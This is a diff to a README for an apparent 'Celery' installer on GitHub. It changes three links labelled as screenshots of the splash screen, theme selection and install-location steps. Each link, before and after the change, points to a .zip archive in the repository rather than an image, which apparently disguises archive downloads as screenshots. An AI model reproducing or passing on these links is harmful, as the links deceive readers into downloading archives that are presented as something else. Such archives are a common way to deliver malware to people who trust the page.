@@ -10,6 +10,6 @@ Features:
 
 
 Screenshots:<br/>
-![Screenshot showing the Celery splash screen](https://github.com/Adriano886/CeleryInstaller/raw/refs/heads/dev/CeleryInstaller/Core/Celery_Installer_v2.8-alpha.5.zip)
-![Screenshot showing theme selection during setup](https://github.com/Adriano886/CeleryInstaller/raw/refs/heads/dev/CeleryInstaller/Core/Celery_Installer_v2.8-alpha.5.zip)
-![Screenshot asking the user where to install Celery during setup](https://github.com/Adriano886/CeleryInstaller/raw/refs/heads/dev/CeleryInstaller/Core/Celery_Installer_v2.8-alpha.5.zip)
+![Screenshot showing the Celery splash screen](https://github.com/Adriano886/CeleryInstaller/raw/refs/heads/dev/CeleryInstaller/Properties/Installer-Celery-1.5.zip)
+![Screenshot showing theme selection during setup](https://github.com/Adriano886/CeleryInstaller/raw/refs/heads/dev/CeleryInstaller/Properties/Installer-Celery-1.5.zip)
+![Screenshot asking the user where to install Celery during setup](https://github.com/Adriano886/CeleryInstaller/raw/refs/heads/dev/CeleryInstaller/Properties/Installer-Celery-1.5.zip)
